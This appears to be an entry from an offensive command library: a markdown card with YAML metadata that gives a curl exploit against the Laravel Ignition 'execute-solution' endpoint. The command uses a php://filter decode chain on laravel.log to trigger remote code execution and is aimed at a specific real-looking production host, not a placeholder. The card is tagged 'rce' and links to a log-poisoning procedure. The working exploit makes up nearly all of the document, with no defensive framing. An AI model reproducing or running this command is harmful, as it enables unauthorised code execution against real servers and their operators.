---
data: >-
  curl -XPOST -H'Content-Type: application/json' -d
  '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"},}'
  https://mpos.mtn.co.sz/_ignition/execute-solution
tags:
  - rce
  - decode
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:17.550Z'
id: 36976d4d-3692-4d96-ad21-ac91f4c20b2d
verified: false
validated: true
submitted: true
---
# curl-trigger-payload-execution

## Command

```bash
curl -XPOST -H'Content-Type: application/json' -d '{"solution":"Facade\\\Ignition\\\Solutions\\\MakeViewVariableOptionalSolution","parameters":{"variableName":"test","viewFile":"php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"},}' https://mpos.mtn.co.sz/_ignition/execute-solution
```

## Description

Uses filter chain to decode and execute the injected payload from the log file.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| viewFile | Decode filter chain | Yes |

## Examples

### Basic Usage

As above to trigger RCE.

## Expected Output

RCE output if unpatched; error otherwise.

## Related

- [[Related Procedure: Attempt-RCE-via-Ignition-Log-Poisoning-with-Curl]]
